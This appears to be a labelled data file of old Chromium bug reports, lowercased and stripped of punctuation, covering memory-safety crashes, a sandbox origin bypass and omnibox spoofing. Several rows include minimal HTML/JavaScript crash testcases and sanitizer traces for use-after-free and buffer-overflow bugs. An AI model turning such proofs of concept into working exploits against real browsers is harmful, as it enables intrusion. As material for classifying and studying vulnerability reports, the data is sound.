media/chromium/chromium/depot_tools/src/v8/src/api.cc:1570 17 in webcore v8proxy runscript v8 handle v8 script media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:378 18 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:346 19 in webcore scriptcontroller evaluate webcore scriptsourcecode const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/scriptcontroller.cpp:201 20 in webcore scriptelement executescript webcore scriptsourcecode const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/scriptelement.cpp:293 21 in webcore scriptelement preparescript wtf textposition const webcore scriptelement legacytypesupport media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/scriptelement.cpp:246 22 in webcore htmlscriptrunner runscript webcore element wtf textposition const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlscriptrunner.cpp:298 23 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlscriptrunner.cpp:172 24 in webcore htmldocumentparser runscriptsforpausedtreebuilder media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:207 25 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:225 26 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:263 27 in webcore htmldocumentparser append webcore segmentedstring const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:372 28 in webcore decodeddatadocumentparser appendbytes webcore documentwriter char const unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/decodeddatadocumentparser.cpp:50 29 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 30 in webkit frameloaderclientimpl committedload webcore documentloader char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1118 31 in void wtf derefifnotnull webcore documentloader webcore documentloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 32 in webcore resourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:291 33 in void wtf derefifnotnull webcore mainresourceloader webcore mainresourceloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 34 in webcore resourceloader didreceivedata webcore resourcehandle char const int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:442 35 in resourcedispatcher onreceiveddata ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:404 36 in bool resourcemsg_datareceived dispatch resourcedispatcher resourcedispatcher int base filedescriptor int int ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:154 37 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:557 38 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 39 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 40 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 41 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 42 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 43 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 44 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 45 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 46 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 47 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 48 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 49 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 50 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 51 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 52 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 53 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 54 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 0 bytes to the right of 88-byte region allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore documentfragment create webcore document media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/documentfragment.cpp:43 2 in webcore range processcontents webcore range actiontype int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/range.cpp:690 3 in webcore range extractcontents int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/range.cpp:941 4 in webcore rangeinternal extractcontentscallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8range.cpp:322 5 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 6 in 7 in 8 in 9 in 10 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 11 in v8 script run media/chromium/chromium/depot_tools/src/v8/src/api.cc:1570 12 in webcore v8proxy runscript v8 handle v8 script media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:378 13 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:346 14 in webcore scriptcontroller evaluate webcore scriptsourcecode const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/scriptcontroller.cpp:201 15 in webcore scriptelement executescript webcore scriptsourcecode const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/scriptelement.cpp:293 16 in webcore scriptelement preparescript wtf textposition const webcore scriptelement legacytypesupport media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/scriptelement.cpp:246 17 in webcore htmlscriptrunner runscript webcore element wtf textposition const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlscriptrunner.cpp:298 18 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlscriptrunner.cpp:172 19 in webcore htmldocumentparser runscriptsforpausedtreebuilder media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:207 20 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:225 19807 aborting stats 26m malloced 19m for red zones by 51866 calls stats 1m realloced by 1013 calls stats 22m freed by 40016 calls stats 0m really freed by 0 calls stats 72m 18444 full pages mmaped in 18 calls mmaps by size class 8:49149 9:8191 10:4095 11:2047 12:1024 13:1024 14:256 15:128 16:64 17:64 18:16 19:8 21:4 mallocs by size class 8:41258 9:5161 10:3173 11:969 12:245 13:781 14:126 15:90 16:19 17:35 18:1 19:4 21:4 frees by size class 8:30768 9:4482 10:2926 11:690 12:162 13:756 14:106 15:84 16:12 17:21 18:1 19:4 21:4 rfrees by size class stats malloc large 44 small slow 258 shadow byte and word fb 00 00 00 fb fb fb fb fb more shadow bytes fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
use of uninitialized value in skalpharuns break vulnerability details use of unitialized value with border styles version chrome version chromium 18.0.983.0 developer build 115770 os linux webkit 535.15 103658 javascript v8 3.8.2.1 operating system linux 64bit reproduction case html head style el2 border-radius 6px webkit-border-after-width 3px webkit-border-after-style dashed webkit-border-end-width 40px style script function crash el2 document.createelement input el2.setattribute id el2 document.body.appendchild el2 var width 150 setinterval function width+=1 el2.style.width=width+'px 10 window.onload=crash script head body body html for crashes please include the following additional information type of crash renderer crash state conditional jump or move depends on uninitialised value s at skalpharuns break short unsigned char int int in chromium/chrome-linux/chromium-browser by skalpharuns add int unsigned int int unsigned int unsigned int int in chromium/chrome-linux/chromium-browser by superblitter blith int int int in chromium/chrome-linux/chromium-browser by walk_convex_edges skedge skpath filltype skblitter int int void skblitter int bool in chromium/chrome-linux/chromium-browser address is 13,623 bytes inside a block of size 24,564 free d address is not stack d malloc d or recently free d	7
heap-use-after-free in webcore htmlinputelement copynonattributeproperties detailed report uploader inferno chromium.org crash type heap-buffer-overflow read 8 crash address crash state crash stack webcore htmlinputelement copynonattributeproperties webcore document importnode free stack webcore element parsersetattributemap webcore htmlconstructionsite createhtmlelement minimized testcase 0.22 kb download script if window.addeventlistener window.addeventlistener load func false function func e document.getelementbyid t1 document.importnode e true script table id t1 td xht input	11
pages can continuously poll the os clipboard for paste data what steps will reproduce the problem 1 open the attachment 2 press ctrl+v what is the expected output the page should not be able to grab a live snapshot of the clipboard at arbitrary times what do you see instead the data in the alert always reflects whatever happens to be on the system clipboard	2
chrome main process crashes when setversion is called when all indexed database name space is used up vulnerability details chrome main process crashes when all indexed database name space is used up after a large amount of open calls with unicode database names and setversion is called from within the onsuccess callback function version chrome version 13.0.782.112 stable operating system windows xp sp3 reproduction case run added script for crashes please include the following additional information type of crash full browser crash main process extra crash info see added stack trace	11
chrome main process crashes when setversion is called when all indexed database name space is used up vulnerability details chrome main process crashes when all indexed database name space is used up after a large amount of open calls with unicode database names and setversion is called from within the onsuccess callback function version chrome version 13.0.782.112 stable operating system windows xp sp3 reproduction case run added script for crashes please include the following additional information type of crash full browser crash main process extra crash info see added stack trace	11
security iframe sandbox unique origin not enforced in extensions vulnerability details the iframe sandbox requires that the framed content run under the privileges of a unique origin and not the privileges of the document you downloaded from but this does n't seem to be true create an extension with a tabs permission and 2 pages the first say popup.html runs with full privileges and frames test.html in a sandbox test.html has code to create a new tab which should fail since test.html is running under a unique origin but it does n't this is a same-origin bypass version chrome version 17.0.932.0 dev operating system ubuntu 11.04 reproduction case attached tarball	5
use-after frees and bad casts with webkit-column-span vulnerability details crash version chrome version chromium 17.0.950.0 developer build 111574 os linux webkit 535.10 trunk 101008 javascript v8 3.7.10 operating system linux 64bit reproduction case attached not sure if it s 1 bug or more for crashes please include the following additional information type of crash renderer crash state 25107 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in webcore rendertablesection setneedscellrecalc 0 1 in webcore renderobject destroy 0 is located 136 bytes to the right of 184-byte region allocated by thread t0 here 0 in malloc usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:49 1 in webcore renderblock createanonymouscolumnsblock const 0 2 in webcore renderblock splitflow webcore renderobject webcore renderblock webcore renderobject 26506 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 0 in webcore renderlayer addchild webcore renderlayer webcore renderlayer 0 1 in webcore renderobject addlayers webcore renderlayer 0 is located 56 bytes inside of 296-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:37 1 in webcore renderboxmodelobject destroylayer 0 2 in webcore renderblock willbedestroyed 0 3 in webcore renderobject destroy 0 28149 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in webcore inlineflowbox addtoline webcore inlinebox 0 1 in webcore renderblock createlineboxes webcore renderobject webcore lineinfo const webcore inlinebox 0 2 in webcore renderblock constructline webcore bidirunlist webcore bidirun webcore lineinfo const 0 is located 8 bytes to the right of 56-byte region allocated by thread t0 here 0 in malloc usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:49 1 in webcore renderbox createinlinebox 0 2 in webcore renderblock createlineboxes webcore renderobject webcore lineinfo const webcore inlinebox 0 27095 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderblock outlinestyleforrepaint const 0 1 in webcore renderobject adjustrectforoutlineandshadow webcore intrect const 0 is located 8 bytes inside of 184-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:37 1 in webcore renderobjectchildlist destroyleftoverchildren 0 2 in webcore renderblock willbedestroyed 0 25803 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 is located 31 bytes inside of 296-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:37 1 in webcore renderboxmodelobject destroylayer 0 2 in webcore renderblock willbedestroyed 0	11
stack-buffer-overflow in canonicalize vulnerability details asan reports a stack buffer overflow for a page with a long webkit-locale this would otherwise look like but here instead of a null crash the address moves easily with the locale string so reporting as a separate potential security bug version chrome version 17.0.962.0 developer build 112977 operating system linux debian 6.0.3 x86_64 reproduction case data text/html div style webkit-locale en_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us_us for crashes please include the following additional information type of crash tab crash state 16611 error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in canonicalize 1 in uloc_addlikelysubtags_46 2 in webcore localetoscriptcodeforfontselection wtf string const 3 in webcore cssstyleselector applyproperty int webcore cssvalue 4 in void webcore cssstyleselector applydeclarations true bool int int bool 5 in webcore cssstyleselector applymatcheddeclarations webcore cssstyleselector matchresult const 6 in webcore cssstyleselector styleforelement webcore element webcore renderstyle bool bool 7 in webcore element styleforrenderer 8 in webcore noderendererfactory createrendererifneeded 9 in webcore node createrendererifneeded 10 in webcore element attach 11 in wtf passrefptr webcore element webcore htmlconstructionsite attach webcore element webcore containernode wtf passrefptr webcore element 12 in webcore htmlconstructionsite inserthtmlelement webcore atomichtmltoken 13 in webcore htmltreebuilder processstarttagforinbody webcore atomichtmltoken 14 in webcore htmltreebuilder processstarttag webcore atomichtmltoken 15 in webcore htmltreebuilder processtoken webcore atomichtmltoken 16 in webcore htmltreebuilder constructtreefromatomictoken webcore atomichtmltoken 17 in webcore htmltreebuilder constructtreefromtoken webcore htmltoken 18 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 19 in webcore htmldocumentparser append webcore segmentedstring const 20 in webcore decodeddatadocumentparser flush webcore documentwriter 21 in webcore documentwriter endifnotloadingmainresource 22 in webcore frameloader finishedloading 23 in webcore mainresourceloader didfinishloading double 24 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const 25 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const 26 in resourcedispatcher dispatchmessage ipc message const 27 in resourcedispatcher onmessagereceived ipc message const 28 in childthread onmessagereceived ipc message const 29 in ipc channelproxy context ondispatchmessage ipc message const 30 in messageloop runtask base pendingtask const 31 in messageloop deferorrunpendingtask base pendingtask const 32 in messageloop dowork 33 in base messagepumpdefault run base messagepump delegate 34 in messageloop runinternal 35 in messageloop run 36 in renderermain content mainfunctionparams const 37 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate 38 in content contentmain int char const content contentmaindelegate 39 in chromemain 40 in main 41 in libc_start_main 42 in start address is located at offset 585 in frame uloc_addlikelysubtags_46 of t0 s stack this frame has 7 object s 32 44 lang.i 96 100 langlength.i 160 166 script.i 224 228 scriptlength.i 288 292 region.i 352 356 regionlength.i 416 573 localebuffer hint this may be a false positive if your program uses some custom stack unwind mechanism longjmp and c exceptions are supported 16611 aborting shadow byte and word f3 00 00 00 05 f3 f3 f3 f3 more shadow bytes 04 f4 f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00	11
global-buffer-overflow in render_line vulnerability details asan reports a global buffer overflow when the attached video is played it also crashes renderer in current stable version version chrome version 16.0.912.63 and 18.0.979.0 operating system linux debian 6.0.3 x86_64 reproduction case chrome bof.webm dmesg grep chrome tail n 1 11848.789410 chrome 4712 segfault at 7f8444e6ad10 ip 00007f8444db3d07 sp 00007f8441174358 error 4 in libffmpegsumo.so 7f8444c4b000+21f000 for crashes please include the following additional information type of crash tab crash state 10160 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t5 0 in render_line third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbis.c:0 is located 7 bytes to the right of global variable str4 third_party/ffmpeg/patched-ffmpeg/libavutil/parseutils.c of size 41 str4 third_party/ffmpeg/patched-ffmpeg/libavutil/parseutils.c is ascii string invalid aa color string s 10160 aborting stats 9m malloced 11m for red zones by 23546 calls stats 0m realloced by 217 calls stats 5m freed by 14213 calls stats 0m really freed by 0 calls stats 56m 14345 full pages mmaped in 14 calls mmaps by size class 8:32766 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 18:16 19:8 20:4 mallocs by size class 8:19796 9:1608 10:1065 11:421 12:182 13:342 14:80 15:14 16:15 17:11 18:5 19:4 20:3 frees by size class 8:11529 9:1041 10:884 11:274 12:108 13:301 14:50 15:8 16:7 17:4 18:3 19:3 20:1 rfrees by size class stats malloc large 23 small slow 141 shadow byte and word f9 00 01 f9 f9 f9 f9 f9 f9 more shadow bytes f9 f9 f9 f9 07 f9 f9 f9 f9 f9 f9 f9 00 01 f9 f9 f9 f9 f9 f9 00 00 07 f9 f9 f9 f9 f9 00 00 00 00 00 01 f9 f9 f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 00 00 00 00 00 04 f9 f9 f9 f9 f9 f9 00 01 f9 f9 f9 f9 f9 f9 07 f9 f9 f9	11
indexeddb with autoincrement fails on object put and crashes chrome chrome version 17.0.963.12 os version 6.1 windows 7 windows server 2008 r2 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 fail firefox 4.x fail ie 7/8/9 fail what steps will reproduce the problem 1 create an indexeddb database 2 create an object store with a keypath property and autoincrement set to true 3 try to store an object in the object store that does not have the keypath property 4 doing anything else like trying to read the object back crashes chrome see the link for a simple example of this working what is the expected result the object should have a property added with the keypath property name and have its value set to 0 or the next available number what happens instead chrome never saves the object and chrome behaves oddly only some features work performing other actions on the indexeddb crashes chrome please provide any additional information below attach a screenshot if possible tested on chrome dev channel and chrome canary useragentstring mozilla/5.0 windows nt 6.1 wow64 applewebkit/535.11 khtml like gecko chrome/17.0.963.12 safari/535.11	11
security chrome drag spoofing vulnerability details 16.0.912.63 m does not properly handle drag and drop operations on url strings which allows user-assisted remote attackers to spoof the omnibox version chrome version 16.0.912.63 m operating system win7 home reproduction case open the drag_spoof_poc.htm for crashes please include the following additional information no crash info	11
safe_browsing signatureutil checksignature crash crashes on windows beta 17.0.963.26 116225 dev and canary 18.0.1001.0 116852 does n't crash on stable it looks like null ptr only but filled security template because it s browser crash to reproduce open crash1.msi using http scheme diff crash1.orig.msi.hexdump crash1.msi.hexdump 2269,2270c2269,2270 00009d80 74 73 2f 74 73 70 63 61 2e 63 72 74 30 13 06 03 ts/tspca.crt0 00009d90 55 1d 25 04 0c 30 0a 06 08 2b 06 01 05 05 07 03 u 0 00009d80 74 73 2f 74 73 70 63 61 2e 63 72 ff f9 5e 23 38 ts/tspca.cr 8 00009d90 33 75 ad 04 0c 30 0a 06 08 2b 06 01 05 05 07 03 3u 0 1ed0.1f84 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=06489678 ebx=00000000 ecx=00303b00 edx=00000000 esi=02fe3940 edi=00000000 eip=58013742 esp=02d7f948 ebp=02d7fa60 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_57bb0000 safe_browsing signatureutil checksignature 58013742 395f0c cmp dword ptr edi+0ch ebx ds:0023:0000000c exceptionaddress 58013742 chrome_57bb0000 safe_browsing signatureutil checksignature exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 0000000c attempt to read from address 0000000c childebp retaddr 02d7fa60 57f5b1f9 chrome_57bb0000 safe_browsing signatureutil checksignature class filepath file_path class safe_browsing clientdownloadrequest_signatureinfo signature_info 02d7fc84 57c572f9 chrome_57bb0000 safe_browsing downloadprotectionservice checkclientdownloadrequest extractfilefeatures void 02d7fcb0 57c57390 chrome_57bb0000 messageloop runtask struct base pendingtask pending_task 02d7fcc0 57c57720 chrome_57bb0000 messageloop deferorrunpendingtask struct base pendingtask pending_task 02d7fd08 57c70201 chrome_57bb0000 messageloop dowork void 02d7fd3c 57c7000e chrome_57bb0000 base messagepumpforui dorunloop void 02d7fd58 57c6fecf chrome_57bb0000 base messagepumpwin runwithdispatcher class base messagepump delegate delegate class base messagepumpwin dispatcher dispatcher 02d7fd64 57c57209 chrome_57bb0000 base messagepumpwin run class base messagepump delegate delegate 02d7fd70 57c5718e chrome_57bb0000 messageloop runinternal void 02d7fd78 57c57111 chrome_57bb0000 messageloop runhandler void 02d7fd98 585e0387 chrome_57bb0000 messageloop run void 02d7fd9c 585e0475 chrome_57bb0000 base thread run class messageloop message_loop 02d7fef8 57c5e5cc chrome_57bb0000 base thread threadmain void 02d7ff04 774bed6c chrome_57bb0000 base anonymous namespace threadfunc void params 02d7ff10 77ad37f5 kernel32 basethreadinitthunk 02d7ff50 77ad37c8 ntdll rtluserthreadstart 02d7ff68 00000000 ntdll rtluserthreadstart	9
heap-use-after-free in xsltparseglobalvariable vulnerability details asan reports a heap-use-after-free when the attached page is opened version chrome version 18.0.1001.0 developer build 116848 operating system linux debian 6.0.3 x86_64 reproduction case chrome-asan xsl.html for crashes please include the following additional information type of crash tab crash state 32682 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in xsltparseglobalvariable 0 1 in xsltparsestylesheetprocess 0 2 in xsltparsestylesheetimporteddoc 0 3 in xsltparsestylesheetdoc 0 4 in webcore xslstylesheet compilestylesheet 0 5 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string 0 6 in webcore xsltprocessor transformtofragment webcore node webcore document 0 7 in webcore v8xsltprocessor transformtofragmentcallback v8 arguments const 0 8 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 9 in 10 in 11 in 12 in 13 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool v8/src/execution.cc:0 14 in v8 script run 0 15 in webcore v8proxy runscript v8 handle v8 script 0 16 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node 0 17 in webcore scriptcontroller evaluate webcore scriptsourcecode const 0 18 in webcore scriptelement executescript webcore scriptsourcecode const 0 19 in webcore scriptelement preparescript wtf textposition const webcore scriptelement legacytypesupport 0 20 in webcore htmlscriptrunner runscript webcore element wtf textposition const 0 21 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const 0 22 in webcore htmldocumentparser runscriptsforpausedtreebuilder 0 23 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession 0 24 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 0 25 in webcore htmldocumentparser append webcore segmentedstring const 0 26 in webcore decodeddatadocumentparser flush webcore documentwriter 0 27 in webcore documentwriter endifnotloadingmainresource 0 28 in webcore frameloader finishedloading 0 29 in webcore mainresourceloader didfinishloading double 0 30 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 31 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 32 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 33 in resourcedispatcher dispatchmessage ipc message const 0 34 in resourcedispatcher onmessagereceived ipc message const 0 35 in childthread onmessagereceived ipc message const 0 36 in ipc channelproxy context ondispatchmessage ipc message const 0 37 in messageloop runtask base pendingtask const 0 38 in messageloop deferorrunpendingtask base pendingtask const 0 39 in messageloop dowork 0 40 in base messagepumpdefault run base messagepump delegate 0 41 in messageloop runinternal 0 42 in messageloop run 0 43 in renderermain content mainfunctionparams const 0 44 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main.cc:0 45 in content contentmain int char const content contentmaindelegate 0 46 in chromemain 0 47 in main 0 48 in libc_start_main home/aurel32/eglibc/eglibc-2.11.2/csu/libc-start.c:260 is located 120 bytes inside of 312-byte region freed by thread t0 here 0 in free 0 1 in xsltfreestyleprecomps 0 2 in xsltfreestylesheet 0 3 in xsltparsestylesheetimporteddoc 0 4 in xsltparsestylesheetdoc 0 5 in webcore xslstylesheet compilestylesheet 0 6 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string 0 7 in webcore xsltprocessor transformtofragment webcore node webcore document 0 8 in webcore v8xsltprocessor transformtofragmentcallback v8 arguments const 0 9 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 10 in 11 in 12 in 13 in 14 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool v8/src/execution.cc:0 15 in v8 script run 0 16 in webcore v8proxy runscript v8 handle v8 script 0 17 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node 0 18 in webcore scriptcontroller evaluate webcore scriptsourcecode const 0 19 in webcore scriptelement executescript webcore scriptsourcecode const 0 20 in webcore scriptelement preparescript wtf textposition const webcore scriptelement legacytypesupport 0 21 in webcore htmlscriptrunner runscript webcore element wtf textposition const 0 22 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const 0 23 in webcore htmldocumentparser runscriptsforpausedtreebuilder 0 24 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession 0 25 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 0 26 in webcore htmldocumentparser append webcore segmentedstring const 0 27 in webcore decodeddatadocumentparser flush webcore documentwriter 0 28 in webcore documentwriter endifnotloadingmainresource 0 previously allocated by thread t0 here 0 in malloc 0 1 in xsltstyleprecompute 0 2 in xsltprecomputestylesheet third_party/libxslt/libxslt/xslt.c:0 3 in xsltparsestylesheetprocess 0 4 in xsltparsestylesheetimporteddoc 0 5 in xsltparsestylesheetdoc 0 6 in webcore xslstylesheet compilestylesheet 0 7 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string 0 8 in webcore xsltprocessor transformtofragment webcore node webcore document 0 9 in webcore v8xsltprocessor transformtofragmentcallback v8 arguments const 0 10 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 11 in 12 in 13 in 14 in 15 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool v8/src/execution.cc:0 16 in v8 script run 0 17 in webcore v8proxy runscript v8 handle v8 script 0 18 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node 0 19 in webcore scriptcontroller evaluate webcore scriptsourcecode const 0 20 in webcore scriptelement executescript webcore scriptsourcecode const 0 32682 aborting stats 2m malloced 4m for red zones by 15794 calls stats 0m realloced by 53 calls stats 1m freed by 9392 calls stats 0m really freed by 0 calls stats 40m 10246 full pages mmaped in 10 calls mmaps by size class 8:16383 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 mallocs by size class 8:14436 9:578 10:403 11:212 